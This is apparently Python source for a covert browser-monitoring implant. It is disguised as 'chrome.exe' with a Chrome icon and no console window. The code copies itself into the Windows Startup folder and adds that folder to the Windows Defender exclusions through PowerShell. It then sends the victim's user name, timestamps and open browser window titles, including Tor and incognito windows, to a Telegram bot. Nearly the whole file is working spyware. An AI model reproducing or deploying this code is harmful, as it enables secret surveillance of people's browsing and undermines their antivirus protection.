"""  #
░▒▓███████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░   ░▒▓██████▓▒░  ░▒▓████████▓▒░  ░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        
░▒▓███████▓▒░  ░▒▓██████▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓██████▓▒░    ░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░               ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░               ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓███████▓▒░  ░▒▓█▓▒░░▒▓█▓▒  ░▒▓████████▓▒░ ░▒▓███████▓▒░  
"""                                                                              
                                                                                          
import pygetwindow as gw
import win32gui
import time
import requests
import winreg as reg
import os
from datetime import datetime
import shutil
import subprocess


#order to genereate the exe >> # pyinstaller --onefile --noconsole --icon=chrome.ico chrome.py

# remarque tout les titles deja envoyee
sent_titles = set()

def add_to_startup():
    user = os.getlogin()  # demande le nom d\utillsateur
    basename = "chrome.exe"  # !!! remarque smia khas tkon the same the script ila knat script chrome.py hena tkon chrome.exe ila knt atconvertih l exe
    src = os.path.join(os.getcwd(), basename)  
    dst = os.path.join("C:/Users", user, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
    
    try:
        shutil.copy(src, dst) 
        print(f"File {basename} has been successfully copied to {dst}.")
        # Call the function to add the path to the Defender whitelist after copying
        add_to_defender_whitelist(dst)
    except Exception as e:
        print(f"An error occurred: {e}")  # Print any error that occurs

def add_to_defender_whitelist(path):
    try:
        # PowerShell command to add the path to Windows Defender whitelist
        command = f'Add-MpPreference -ExclusionPath "{path}"'
        
        # Run the PowerShell command using subprocess
        subprocess.run(["powershell", "-Command", command], check=True)
        
        print(f"The path {path} has been successfully added to the Windows Defender whitelist.")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

add_to_startup()

browser_titles = [
    "Google Chrome",
    "Mozilla Firefox",
    "Edge",
    "Incognito",
    "Dolphin",
    "Anty",
    "GoLogin",
    "OBS",
    "Orbita",
    "Brave",
    "Opera",
    "Vivaldi",
    "Tor Browser",
    "Multilogin",
    "SessionBox",
    "XBrowser",
    "Ghost Browser",
    "Cyberfox"
]

while True:
    print("EXECUTED")
    current_titles = gw.getAllTitles()  # Get all window titles
    for title in current_titles:
        if any(browser in title for browser in browser_titles):
            hwnd = win32gui.FindWindow(None, title)
            title_text = win32gui.GetWindowText(hwnd)
            message = f"is visit: {title_text}"

            # Check if the title has already been sent
            if title_text not in sent_titles:
                sent_titles.add(title_text)
                user = os.getlogin()  
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                ID = YOUR_CHAT_ID 
                TK = "YOUR_BOT_TOKEN"
                send_url = f"https://api.telegram.org/bot{TK}/sendMessage?chat_id={ID}"
                tele_message = (
                        f"{send_url}&text= !!! A LJADID !!!:\n"
                        f"---------------------------\n"
                        f"[-] User:\n{user}\n"
                        f"[-] Time:\n{current_time}\n"
                        f"[-] Title:\n{title_text}\n"
                        f"[-] Visited:\n{title_text}"
                    )

                # Send the message
                response = requests.get(tele_message)
    
    time.sleep(5)  # Adjust the interval as necessary
